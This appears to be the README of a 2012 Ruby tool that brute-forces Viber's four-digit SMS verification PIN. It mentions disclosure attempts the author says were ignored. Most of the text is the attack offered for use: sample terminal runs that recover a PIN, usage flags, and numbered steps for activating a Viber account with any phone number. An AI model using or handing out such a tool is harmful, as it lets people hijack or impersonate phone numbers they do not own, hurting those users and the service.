viber-pin-bf.rb - Viber PIN bruteforce
=========
 -
This little piece of software will bruteforce the Viber "PIN" key. Viber is a Skype-like  software that claims to have 100 million worldwide users.

Instead of having Viber usernames you use your own mobile phone number as username. When signing up for Viber you confirm that you own the mobile phone number by entering a four digit PIN code that you get by SMS in the registation process.

Four digit, no bruteforce protection, API-axss - A winning concept. Or well, they  have "some kind" of bruteforce "protection". After something like ten tries they increment the PIN-code by 1.

> I've tried to inform them about this. But they ignore my tweets and mails. They ignoring me results in me ignoring them.

    myBox:viber-auth-bf tim$ ./viber-auth-bf.rb -u 128bcab992159630bd9a1c00f1e75b44cef40a90
    [+] Figuring out PIN for 128bcab992159630bd9a1c00f1e75b44cef40a90.
    [+] Success: found PIN: 9477

INSTRUCTIONS - STICK TO THOSE!
-----
    myBox:viber-pin-bf tim$ ./viber-pin-bf.rb 
    Viber PIN Bruteforce 0.1 (c) 2012 Tim Jansson <tim@timtux.net>
 
    --- READ CAREFULLY ---
    1: Install Viber on iPhone.
    2: Register new account, enter any telephone number.
    3: When asked for PIN-code. Go back one step.
    4: To get the PIN to activate the account run this program
       with your iPhone UDID as -u agrument.
    5: Click [Continue] on the phone, [OK] and enter PIN received by ./viber-pin-bf.rb.
    6: Profit?!?!
     
    --- IMPORTANT! ---
    THE PIN CODE SENT WON'T BE THE SAME AS RECEIVED BY VIBER.
    BUT WILL WORK AS LONG AS YOU STICK TO THE INSTRUCTIONS :)
     
    Usage  : ./viber-pin-bf.rb --iphone-udid {UDID}
    Example: ./viber-pin-bf.rb --iphone-udid 128bcab992159630bd9a1c00f1e75b44cef40a90
      --iphone-udid, -u <s>:   Your iPhone UDID 
          --version, -v:   Print version and exit
             --help, -h:   Show this message